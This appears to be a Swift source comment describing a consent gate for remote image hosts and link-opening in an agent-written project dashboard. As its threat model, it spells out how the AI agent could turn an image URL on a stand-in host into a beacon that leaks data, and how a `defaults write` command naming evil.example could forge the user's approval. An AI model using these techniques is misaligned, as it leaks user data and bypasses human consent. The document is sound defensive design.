/// Which remote image hosts the user has agreed to let a project's
/// dashboard contact.
///
/// **The problem (P8 SEC-M4).** An image widget in `.scarf/dashboard.json`
/// fires its request the moment the dashboard renders: no click, no
/// chrome, nothing to decline — and the dashboard re-renders on every
/// watcher tick. `dashboard.json` is written by the agent. So the widget is
/// a beacon the agent aims: `https://x.example/p.png?d=<whatever it wants
/// to say>` is a GET made from the user's machine, through the user's
/// network, reporting the user's IP, repeatedly, to a host the user never
/// chose. Restricting the scheme to `https` (which shipped earlier) closed
/// the local-file read and the plaintext channel; it did not and could not
/// close this, because a remote image IS a request.
///
/// **The gate.** First render of a host shows a placeholder naming it, with
/// an Allow button. Nothing is fetched until the user presses it. The
/// answer is remembered per (project, host) so a dashboard the user has
/// blessed doesn't nag on every tick, and it is scoped to the HOST rather
/// than the URL so an agent can't re-ask its way through by changing the
/// path — and so allowing one image doesn't allow a different server.
///
/// **Where it lives, and why not on disk.** In `UserDefaults`, in the app's
/// own container. Every candidate inside `~/.hermes` — the project's
/// `.scarf/`, the registry directory, a sidecar beside the grants file — is
/// writable by the agent whose dashboard is doing the asking, and a consent
/// record the asker can write is not a consent record (the same reasoning
/// that put the mini-app grant key in the Keychain and made the grants file
/// per-machine). This is a decision a person made at a machine; it does not
/// travel with the repo and must not.
///
/// **…but the carrier is not the gate.** "The app's own container" is a
/// weaker claim than it reads: the agent this widget belongs to has a
/// terminal, and
/// `defaults write <bundle> com.scarf.imageWidget.allowedHosts.<path> -array
/// evil.example` pre-approves the beacon without the user ever seeing the
/// card. Being harder to reach than `~/.hermes` is not the same as being out
/// of reach. So each record is HMAC-tagged with the machine key
/// `MiniAppGrantSigner` already mints and keeps in the login Keychain, over
/// `(version, projectId, host)` — Scarf can mint the tag, the agent cannot,
/// and a record that doesn't verify is not a record: it is ignored, the card
/// comes back, and the user is asked. `UserDefaults` stays the carrier; it
/// just stopped being trusted.
///
/// A tag is bound to the project id it was recorded under (the project
/// ROOT, on the surfaces that lack a UUID). That binds the consent to a
/// path rather than to a project identity, so a registry row rewritten to
/// point at a previously-blessed path still inherits that path's
/// allowlist. Closing THAT needs a stable uuid on the widget surface, which
/// the dashboard environment doesn't carry today; the tag is already
/// composed so the id can be swapped for a uuid without a format change.
///
/// Local files and project-contained images never reach here — they are
/// resolved under the project root by `WidgetPathResolver` and involve no
/// network at all.
///
/// **Two questions, one mechanism.** The same shape answers "may a mini-app
/// hand a link at this host to your browser?" (`scarf.openURL`, the
/// `open_url` permission). It is the same problem — a per-(project, host)
/// record of something a person agreed to, kept where the agent asking can
/// write — so it reuses the machinery instead of forking a second store.
/// `Purpose` keeps the two sets of records apart, in both the defaults key
/// and the signed payload, so neither decision can be read as the other.
